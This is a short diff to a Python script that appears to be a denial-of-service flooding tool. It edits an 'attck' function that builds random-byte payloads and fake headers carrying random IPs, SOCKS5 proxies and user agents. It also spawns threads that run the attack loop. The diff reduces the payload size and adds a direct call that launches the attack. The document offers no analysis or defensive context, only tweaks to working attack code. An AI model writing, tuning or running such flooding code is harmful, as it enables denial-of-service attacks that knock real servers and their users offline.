@@ -879,7 +879,7 @@ def start():
             print('[+] server error')
 def attck():
   global userip,socks5,useragent2,useragents
-  data3 = random._urandom(85000)
+  data3 = random._urandom(8500)
   xx = int(0)
   anjgall = "Anjing: "+random.choice(userip)+random.choice(socks5)+"\r\n"
   userkau = "UserAgents2: "+random.choice(useragent2)+random.choice(useragents)+random.choice(userip)+"\r\n"
@@ -903,7 +903,7 @@ def attck():
         except:
             s.close()
             print('[+] server error')
-
+attck()
 for bj in range(th):
    thred = threading.Thread(target=start)
    thred2 = threading.Thread(target=attck)
